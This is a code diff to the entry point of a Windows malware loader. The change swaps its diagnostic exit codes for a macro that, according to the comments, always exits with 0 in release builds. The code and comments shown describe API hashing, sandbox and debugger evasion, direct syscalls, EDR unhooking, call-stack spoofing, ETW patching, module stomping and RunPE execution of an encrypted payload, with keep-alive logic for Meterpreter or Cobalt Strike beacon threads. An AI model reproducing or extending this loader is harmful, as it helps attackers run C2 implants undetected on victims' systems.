@@ -35,15 +35,15 @@ extern "C" int EntryPoint() {
     ApiHashing_InitHashes();
 
     HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
-    if (!hKernel32) return 1;
+    if (!hKernel32) return (int)LOADER_EXIT(1);
 
     pfnExitProcess  pExitProcess  = RESOLVE_API(pfnExitProcess,  hKernel32, g_Hash_ExitProcess);
     pfnVirtualAlloc pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, hKernel32, g_Hash_VirtualAlloc);
     pfnVirtualFree  pVirtualFree  = RESOLVE_API(pfnVirtualFree,  hKernel32, g_Hash_VirtualFree);
 
-    if (!pExitProcess)  return 22;
-    if (!pVirtualAlloc) return 23;
-    if (!pVirtualFree)  return 24;
+    if (!pExitProcess)  return (int)LOADER_EXIT(22);
+    if (!pVirtualAlloc) return (int)LOADER_EXIT(23);
+    if (!pVirtualFree)  return (int)LOADER_EXIT(24);
 
     /* Step 1: Read .rsrc metadata — opsecFlags must be known before evasion
      * checks so that per-check EVASION_FLAG_NO_* bits can be honoured.
@@ -67,7 +67,7 @@ extern "C" int EntryPoint() {
                                 key_salt, dll_indices, &exportHash, &pExportArg, &pSpoofExe,
                                 &pSemaphoreName, &sleepFwdMs, &uptimeMin, &hammerMs,
                                 &opsecFlags, &dwExtractionError)) {
-        pExitProcess(dwExtractionError);
+        pExitProcess(LOADER_EXIT(dwExtractionError));
     }
 
     /* Step 1.5: Evasion — timing delay + sandbox/debugger detection.
@@ -83,8 +83,8 @@ extern "C" int EntryPoint() {
     if (Evasion_RunChecks(opsecFlags, pSemaphoreName, sleepFwdMs, uptimeMin)) pExitProcess(0);
 
     /* Step 2: Syscalls + NT API init — always required */
-    if (!Syscalls_Init())  pExitProcess(29);
-    if (!InitNtApi())      pExitProcess(30);
+    if (!Syscalls_Init())  pExitProcess(LOADER_EXIT(29));
+    if (!InitNtApi())      pExitProcess(LOADER_EXIT(30));
 
     /* Step 2.5: Optional EDR userland unhooker.
     * Restores original .text bytes in ntdll/kernel32/kernelbase from
@@ -103,9 +103,9 @@ extern "C" int EntryPoint() {
      * stack walkers.  Skip when OPSEC_FLAG_NO_CALLSTACK is set. */
     if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) {
         if (!StackSpoof_Init()) {
-            /* 41 = ntdll base, 42 = AddRsp gadget, 43 = JmpRbx gadget,
-             * 44 = RtlUserThreadStart export */
-            pExitProcess(40 + g_SpoofInitFailStep);
+            /* Debug: 41 = ntdll base, 42 = AddRsp gadget, 43 = JmpRbx gadget,
+             * 44 = RtlUserThreadStart export.  Release: always 0. */
+            pExitProcess(LOADER_EXIT(40 + g_SpoofInitFailStep));
         }
     }
 
@@ -116,10 +116,10 @@ extern "C" int EntryPoint() {
      *   ETW events    → Opsec_PatchEtw (EtwEventWrite → xor eax,eax / ret) */
     if (!(opsecFlags & OPSEC_FLAG_NO_ETW)) {
         if (!Opsec_PatchEtw()) {
-            /* 61 = no ntdll, 62 = no EtwEventWrite export,
+            /* Debug: 61 = no ntdll, 62 = no EtwEventWrite export,
              * 63 = Syscalls_GetParamsByHash failed for NtProtectVirtualMemory,
-             * 64 = NtProtectVirtualMemory returned non-success */
-            pExitProcess(60 + g_EtwFailStep);
+             * 64 = NtProtectVirtualMemory returned non-success.  Release: always 0. */
+            pExitProcess(LOADER_EXIT(60 + g_EtwFailStep));
         }
     }
 
@@ -194,7 +194,7 @@ extern "C" int EntryPoint() {
 
     if (!execBuf) {
         pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(33);
+        pExitProcess(LOADER_EXIT(33));
     }
 
     // Copy ONLY the decryptor stub into execBuf (stomped .text section).
@@ -210,7 +210,7 @@ extern "C" int EntryPoint() {
         custom_memset(execBuf, 0, payloadSize);
         custom_memset(pEncryptedPayload, 0, payloadSize);
         pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(34);
+        pExitProcess(LOADER_EXIT(34));
     }
 
     SetSyscallParams(dwProtectSsn, pProtectTrampoline);
@@ -226,7 +226,7 @@ extern "C" int EntryPoint() {
         custom_memset(execBuf, 0, payloadSize);
         custom_memset(pEncryptedPayload, 0, payloadSize);
         pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(34);
+        pExitProcess(LOADER_EXIT(34));
     }
 
     // Call decryptor: pass payload pointer in RCX (Windows x64 first argument).
@@ -251,7 +251,7 @@ extern "C" int EntryPoint() {
         custom_memset(execBuf, 0, payloadSize);
         custom_memset(pEncryptedPayload, 0, payloadSize);
         pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(34);
+        pExitProcess(LOADER_EXIT(34));
     }
 
     custom_memset(pEncryptedPayload, 0, payloadSize);
@@ -303,7 +303,7 @@ extern "C" int EntryPoint() {
         if (!NT_SUCCESS(status)) {
             custom_memset(pDecompressedPE, 0, origDecompSize);
             pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
-            pExitProcess(36);
+            pExitProcess(LOADER_EXIT(36));
         }
 
         /* Disable RSP pivot before handing over — same invariant as RunPE's PreExecuteCb */
@@ -345,11 +345,11 @@ extern "C" int EntryPoint() {
         custom_memset(pDecompressedPE, 0, origDecompSize);
         pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
 
-        if (runPeRes != 0) pExitProcess(runPeRes);
+        if (runPeRes != 0) pExitProcess(LOADER_EXIT(runPeRes));
     }
 
     /* OPSEC_FLAG_KEEP_ALIVE: exit only the loader thread, leave beacon threads running.
-     * ExitProcess(777) would kill every thread — including the C2 implant's threads.
+     * ExitProcess would kill every thread — including the C2 implant's threads.
      * ExitThread(0) terminates this thread only; the process stays alive as long as
      * any other thread is running.  Required for DLL payloads (Meterpreter, CS beacon)
      * that spawn their own threads from DllMain or the invoked export. */
@@ -358,6 +358,6 @@ extern "C" int EntryPoint() {
         if (pExitThread) pExitThread(0);
         /* Fallthrough to ExitProcess if ExitThread resolution failed */
     }
-    pExitProcess(777);
-    return 777;
+    pExitProcess(LOADER_EXIT(777));
+    return (int)LOADER_EXIT(777);
 }
